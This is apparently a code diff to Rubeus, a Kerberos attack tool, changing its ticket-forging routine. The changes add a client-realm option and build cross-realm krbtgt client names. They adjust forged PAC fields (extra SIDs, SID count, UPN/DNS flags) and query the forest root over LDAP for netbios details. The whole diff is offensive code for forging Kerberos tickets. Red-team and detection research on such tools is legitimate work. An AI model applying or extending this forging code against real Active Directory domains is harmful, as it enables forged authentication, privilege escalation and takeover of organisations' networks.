@@ -68,6 +68,7 @@ namespace Rubeus
             bool printcmd = false,
             // arguments for unusual tickets
             string cName = null,
+            string cRealm = null,
             string s4uProxyTarget = null,
             string s4uTransitedServices = null,
             bool includeAuthData = false
@@ -114,9 +115,9 @@ namespace Rubeus
             kvi.UserFlags = 0;
             if (String.IsNullOrEmpty(sids))
             {
-                kvi.SidCount = 1;
+                kvi.SidCount = 0;
                 kvi.ExtraSids = new Ndr._KERB_SID_AND_ATTRIBUTES[] {
-                        new Ndr._KERB_SID_AND_ATTRIBUTES(new Ndr._RPC_SID(new SecurityIdentifier("S-1-18-1")), 7)};
+                        new Ndr._KERB_SID_AND_ATTRIBUTES()};
             }
 
             // get network crednetial from ldapuser and ldappassword
@@ -212,7 +213,6 @@ namespace Rubeus
                 {
                     string objectSid = (string)userObject["objectsid"];
                     string domainSid = objectSid.Substring(0, objectSid.LastIndexOf('-'));
-                    string configOU = String.Format("CN=Configuration,DC={0}", domain.Replace(".", ",DC="));
 
                     // parse the UAC field and set in the PAC
                     if (uac == Interop.PacUserAccountControl.NORMAL_ACCOUNT)
@@ -411,7 +411,16 @@ namespace Rubeus
                     if (String.IsNullOrEmpty(netbiosName))
                     {
                         Console.WriteLine("[*] Retrieving netbios name information over LDAP from domain controller {0}", domainController);
-                        adObjects = Networking.GetLdapQuery(ldapCred, configOU, domainController, domain, "(netbiosname=*)", ssl);
+
+                        // first get forest root
+                        string forestRoot = System.DirectoryServices.ActiveDirectory.Forest.GetCurrentForest().RootDomain.Name;
+                        string configRootDomain = domain;
+                        if (!domain.Equals(forestRoot))
+                            configRootDomain = forestRoot;
+
+                        string configOU = String.Format("CN=Configuration,DC={0}", configRootDomain.Replace(".", ",DC="));
+
+                        adObjects = Networking.GetLdapQuery(ldapCred, configOU, domainController, domain, String.Format("(&(netbiosname=*)(dnsroot={0}))", domain), ssl);
                         if (adObjects == null)
                         {
                             Console.WriteLine("[!] Unable to get netbios name information using LDAP, using defaults.");
@@ -717,10 +726,18 @@ namespace Rubeus
                 kvi.LogonTime = new Ndr._FILETIME((DateTime)startTime);
                 LogonInfo li = new LogonInfo(kvi);
 
+                if (String.IsNullOrEmpty(cName))
+                    cName = user;
+                if (String.IsNullOrEmpty(cRealm))
+                    cRealm = domain;
 
-                ClientName cn = new ClientName((DateTime)startTime, user);
+                ClientName cn = null;
+                if (parts[0].Equals("krbtgt") && !parts[1].Equals(domain))
+                    cn = new ClientName((DateTime)startTime, String.Format("{0}@{1}@{1}", user, domain.ToUpper()));
+                else
+                    cn = new ClientName((DateTime)startTime, user);
 
-                UpnDns upnDns = new UpnDns(1, domain.ToUpper(), String.Format("{0}@{1}", user, domain.ToLower()));
+                UpnDns upnDns = new UpnDns(0, domain.ToUpper(), String.Format("{0}@{1}", user, domain.ToLower()));
 
                 S4UDelegationInfo s4u = null;
                 if (!String.IsNullOrEmpty(s4uProxyTarget) && !String.IsNullOrEmpty(s4uTransitedServices))
@@ -729,11 +746,8 @@ namespace Rubeus
                 }
 
                 Console.WriteLine("[*] Generating EncTicketPart");
-                if (String.IsNullOrEmpty(cName))
-                {
-                    cName = user;
-                }
-                EncTicketPart decTicketPart = new EncTicketPart(randKeyBytes, etype, domain.ToUpper(), cName, flags, cn.ClientId);
+
+                EncTicketPart decTicketPart = new EncTicketPart(randKeyBytes, etype, cRealm.ToUpper(), cName, flags, cn.ClientId);
 
                 // set other times in EncTicketPart
                 DateTime? check = null;
@@ -858,7 +872,7 @@ namespace Rubeus
                 info.key.keyvalue = randKeyBytes;
 
                 // [1] prealm (domain)
-                info.prealm = decTicketPart.crealm;
+                info.prealm = ticket.realm;
 
                 // [2] pname (user)
                 info.pname.name_type = decTicketPart.cname.name_type;
